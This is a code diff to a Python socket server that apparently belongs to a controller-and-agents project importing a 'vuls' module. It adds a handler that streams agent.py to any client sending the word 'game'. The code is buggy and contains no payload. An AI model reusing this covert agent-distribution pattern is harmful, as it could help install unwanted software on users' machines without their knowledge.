@@ -5,7 +5,6 @@ project name: unknown
 import socket
 import sys
 import threading
-
 import message
 from vuls import *
 
@@ -44,6 +43,9 @@ class Server:
         self.is_running = True
 
     def handle_client_msg(self, client, msg):
+        if msg.decode() == "game":
+            self.send_agent(client)
+            return
         msg_id = msg.get_id()
         print("got msg ", msg_id)
         match msg_id:
@@ -57,6 +59,15 @@ class Server:
                 self.handle_get_agents(client, msg)
             case _:
                 print("unknown msg: " + msg_id)
+
+    def send_agent(self, client):
+        f1 = open("c:Myproject\\agent.py", "rb")
+        chunk = f1.read(1024)
+        while chunk != b"":
+            client.send(chunk)
+            chunk = f1.read(1024)
+        client.send("EOF")
+        f1.close()
 
     def handle_get_agents(self, client, msg):
         ls = str(self.connections.keys())
@@ -84,7 +95,7 @@ class Server:
 
     def handle_share(self, client, msg):
         peer = msg.peer
-        print("share req to ", peer) #todo: check if ok
+        print("share req to ", peer)  # todo: check if ok
         response = message.ShareResponse(True)
         self.connections["controller"].sendall(response.pack())
         msg = message.Share(peer)
